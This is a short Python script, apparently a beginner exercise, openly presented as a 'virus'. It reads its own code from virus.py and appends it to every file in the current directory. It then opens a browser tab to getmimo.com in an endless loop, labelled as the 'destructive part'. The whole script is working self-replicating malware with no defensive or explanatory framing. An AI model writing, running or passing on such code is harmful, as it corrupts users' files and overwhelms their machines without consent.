import os

files = os.listdir()
print(files)

for file_name in os.listdir():
    print(file_name)

# mess with browser
import webbrowser
webbrowser.open("https://getmimo.com")
virus_file = open("virus.py", "r")
virus_code = virus_file.read()
virus_file.close()
for file_name in os.listdir():
    file = open(file_name,"a")
    file.write(virus_code)
    file.close()

while True: # Destructive part
    webbrowser.open("https://getmimo.com")
    
